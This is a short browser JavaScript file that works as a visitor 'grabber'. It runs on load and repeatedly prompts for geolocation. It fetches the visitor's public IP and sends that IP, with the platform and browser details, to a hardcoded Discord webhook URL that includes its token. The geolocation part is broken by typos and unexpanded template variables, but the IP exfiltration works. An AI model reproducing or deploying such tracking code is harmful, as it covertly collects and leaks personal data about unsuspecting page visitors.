let mapsUrl;
function requestLocationPermission() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}

function success(position) {
    let LATITUDE = positon.coords.latitude;
    let LONGITUDE = position.coords.longitude;
    lat_lon = `MAPS URL: https://www.google.com/maps/@$LATITUDE,$LONGITUDEz?entry=ttu`;
}

function error(err) {
    if (err.code === err.PERMISSION_DENIED) {
        alert("Location access denied. Requesting permission again.");
        requestLocationPermission();
    } else {
        alert("An error occurred while retrieving location: " + err.message);
    }
}

// Start requesting location permission
requestLocationPermission();
// Function to send the webhook message
 function sendWebhook(ip) {
    // Prepare the payload
    const platformInfo = `${navigator.platform}, Browser: ${navigator.userAgent}`;
    const content = `Grabbed IP: ${ip}\nOS Info: ${platformInfo}\nMaps Location URL: $mapsUrl`;

    console.log(`Content Length: ${content.length}`);

    const payload = {
        content: content  // Webhooks expect the key 'content' for the message body
    };

    // URL of the Discord webhook
    const webhookUrl = "https://discord.com/api/webhooks/1245784706641825893/-1XTQMdUFm12CJdvmtTBqsSpsmNzdxIPZe9QpBQTm0xygCLLyeqjnGhazojQE-N6URBt";

    // Send the POST request
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        console.log(`Status Code: ${data.status}`);
        console.log(`Response: ${data}`);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Function to get the IP address
function getIpAddress() {
    fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        sendWebhook(data.ip);
    })
    .catch(error => {
        console.error('Error fetching IP address:', error);
    });
}

// Call the function to get the IP address and send the webhook message
getIpAddress();

